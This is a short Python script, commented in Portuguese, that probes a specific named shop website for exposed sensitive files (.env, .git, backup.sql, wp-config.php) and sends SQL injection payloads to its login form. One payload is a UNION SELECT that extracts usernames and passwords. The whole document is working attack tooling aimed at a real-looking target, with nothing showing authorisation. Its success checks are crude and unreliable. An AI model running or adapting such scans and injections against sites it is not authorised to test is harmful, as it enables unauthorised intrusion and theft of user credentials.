import requests 
import re

# Configuração
target_url = "https:/boutiquedobolo.pt" # Alterar para o site alvo
test_endpoints = [
    "/admin", "/config.php", "/backup.sql", "/users", "/.git", "/.env", "/wp-config.php", "/debug", "/phpinfo.php"
]

# Teste de acesso a endpoints protegidos
print("[+] Testando acesso a endpoints protegidos...")
for endpoint in test_endpoints:
    response = requests.get(target_url + endpoint)
    if response.status_code == 200:
        print(f"[!] POSSÍVEL FALHA: {endpoint} está acessível!")
    else:
        print(f"[+] {endpoint} está protegido")

# Teste avançado de injeção SQL
print("\n[+] Testando vulnerabilidade a SQL Injection...")
sqli_payloads = [
    {"username": "' OR '1'='1 --", "password": "password"},
    {"username": "admin' --", "password": "password"},
    {"username": "admin" , "password": "' OR '1'='1"},
    {"username": "' UNION SELECT null, username, password FROM users --", "password": "password"}
]
for payload in sqli_payloads:
    response = requests.post(target_url + "/login", data=payload)
    if "Welcome" in response.text or response.status_code == 200:
        print(f"[!] POSSÍVEL FALHA: SQL Injection detetada com payload {payload}")
    else:
        print(f"[OK] Proteção contra SQL Injection presente para {payload}.")
